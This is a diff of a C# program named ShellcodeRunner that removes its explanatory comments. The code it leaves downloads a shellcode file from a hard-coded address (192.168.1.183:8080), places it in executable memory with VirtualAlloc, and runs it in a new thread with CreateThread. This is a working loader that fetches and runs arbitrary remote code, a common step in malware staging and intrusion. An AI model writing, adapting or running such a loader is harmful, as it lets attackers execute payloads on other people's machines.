@@ -22,22 +22,22 @@ namespace ShellcodeRunner
         static void Main(string[] args)
         {
             
-            //Download the shellcode
+            
             WebClient client = new WebClient();
             string url = "http://192.168.1.183:8080/shellcode.bin";
             byte[] Shellcode = client.DownloadData(url);
-            //Allocate memory for shellcode
+
             IntPtr allocMemAddress = VirtualAlloc(IntPtr.Zero, (uint)Shellcode.Length, 0x00001000 | 0x00002000, 0x40);
-            //Copy shellcode to memory
+
             Marshal.Copy(Shellcode, 0, allocMemAddress, Shellcode.Length);
-            //Create thread to run shellcode
+
             IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
-            //Wait for thread to complete
+
             WaitForSingleObject(threadHandle, 0xFFFFFFFF);
             Console.WriteLine("Shellcode executed");
         }
 
-        //Importing VirtualAlloc from Kernel32.dll
+
         [DllImport("kernel32")]
         public static extern IntPtr VirtualAlloc(
             IntPtr lpStartAddr,
@@ -46,8 +46,8 @@ namespace ShellcodeRunner
             uint flProtect
             );
 
-        //Importing WaitForSingleObject from Kernel32.dll
-        [DllImport("kernel32")]
+
+       [DllImport("kernel32")]
         public static extern UInt32 WaitForSingleObject(
             IntPtr hHandle,
             UInt32 dwMilliseconds
